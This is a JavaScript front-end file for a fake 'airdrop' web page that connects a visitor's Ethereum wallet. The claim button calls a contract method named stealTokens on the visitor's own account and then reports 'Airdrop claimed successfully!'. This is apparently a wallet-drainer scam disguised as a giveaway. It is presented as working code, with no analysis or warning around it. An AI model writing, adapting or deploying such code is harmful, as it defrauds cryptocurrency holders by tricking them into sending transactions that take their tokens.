try {
    console.log('eth.js loaded successfully');
} catch (error) {
    console.error('Error in eth.js:', error.message || error);
}


// Avoid redeclaring accounts here
// Let the global variable accounts be used

// Function to connect the wallet and update accounts
async function connectWallet() {
    try {
        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }); // Set global accounts
        console.log("Connected accounts:", accounts);

        const claimButton = document.getElementById('claimAirdropButton');
        claimButton.disabled = false; // Enable the button after wallet connection

    } catch (error) {
        console.error("Error connecting to wallet:", error);
        alert("Failed to connect to wallet. Please try again.");
    }
}

// Function to claim the airdrop
async function claimAirdrop() {
    console.log('Attempting to claim airdrop...');
    
    // Check if accounts are available
    if (!Array.isArray(accounts) || accounts.length === 0) {
        console.error('No accounts connected');
        alert('Please connect to a wallet first!');
        return;
    }

    // Ensure contract details are loaded before proceeding
    if (!contractABI || !contractAddress) {
        console.error('Contract details not loaded:', { contractABI, contractAddress });
        alert('Contract details not loaded. Please try again later.');
        return;
    }

    try {
        console.log('Claiming airdrop...');
        const contract = new web3.eth.Contract(contractABI, contractAddress);
        // Use the first account in the accounts array
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert('Airdrop claimed successfully!');
    } catch (error) {
        console.error('Error claiming airdrop:', error);
        alert('Error claiming airdrop');
    }
}

// Attach event listeners after DOM is loaded
window.addEventListener('DOMContentLoaded', () => {
    const connectButton = document.getElementById('connectButton'); // Replace with your connect button ID
    connectButton.addEventListener('click', connectWallet);

    const claimButton = document.getElementById('claimAirdropButton'); // Replace with your claim button ID
    claimButton.disabled = true; // Initially disable the claim button
    claimButton.addEventListener('click', claimAirdrop);
});
